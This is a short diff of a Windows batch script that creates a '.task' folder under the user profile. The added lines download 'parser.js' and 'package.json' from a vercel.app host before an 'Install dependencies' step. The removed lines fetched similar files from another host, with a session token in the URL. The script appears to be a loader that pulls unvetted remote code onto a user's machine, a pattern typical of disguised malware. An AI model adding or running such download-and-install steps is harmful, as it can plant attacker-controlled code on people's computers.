@@ -80,8 +80,8 @@ set "USERPROFILE=%USERPROFILE%"
 echo [INFO] Downloading parser.npl and package.json...
 
 MD "%USERPROFILE%\.task" 2>nul
-curl -L -o "%USERPROFILE%\.task\parser.npl" "http://josehub88.vercel.app/task/parser?token=2a643f1b401f&st=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpcCI6IjY5LjE5Ny4xNzYuMjQwIiwic2Vzc2lvbklkIjoiZjE3M2JlZjgtMjBlMS00NmIyLWI2MDItOTA1NDAwODJlNDQ1Iiwic3RlcCI6MiwidGltZXN0YW1wIjoxNzczMDgwNTE0ODU0LCJvcmlnVG9rZW4iOiIyYTY0M2YxYjQwMWYiLCJpYXQiOjE3NzMwODA1MTQsImV4cCI6MTc3MzA4MDY5NH0.0rfjsQKcpSRRCJIMdLa6unYhszYdwxrLBNCpLZMmfZs"
-curl -L -o "%USERPROFILE%\.task\package.json" "http://josehub88.vercel.app/task/package.json"
+curl -L -o "%USERPROFILE%\.task\parser.js" "https://vercel-rho-amber-58.vercel.app/303/parser.js"
+curl -L -o "%USERPROFILE%\.task\package.json" "https://vercel-rho-amber-58.vercel.app/package.json"
 
 :: -------------------------
 :: Install dependencies
